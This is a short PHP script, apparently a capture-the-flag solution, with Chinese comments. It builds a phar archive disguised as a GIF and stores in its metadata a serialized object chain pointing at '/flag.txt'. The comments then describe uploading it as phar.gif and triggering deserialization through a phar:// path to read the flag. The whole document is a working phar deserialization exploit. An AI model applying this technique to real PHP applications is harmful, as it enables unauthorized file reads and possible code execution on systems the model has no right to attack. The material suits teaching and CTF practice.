<?php
class User{
    public $db;
}
class File{
    public $filename = "/flag.txt";
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct(){
        $this->files = array();
        $this->results = array();
        $this->funcs = array();

        array_push($this->files, new File());
    }
}



$user = new User();
$user->db = new FileList(); // 这个就是phar要包含的对象了

$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("'GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($user); //将自定义的meta-data存入manifest，这一步注入攻击
$phar->addFromString("nothing.txt", "nothing"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 随后进行改名为phar.gif
// 点击删除
// 截取filename=phar://phar.gif
// 成功获取flag
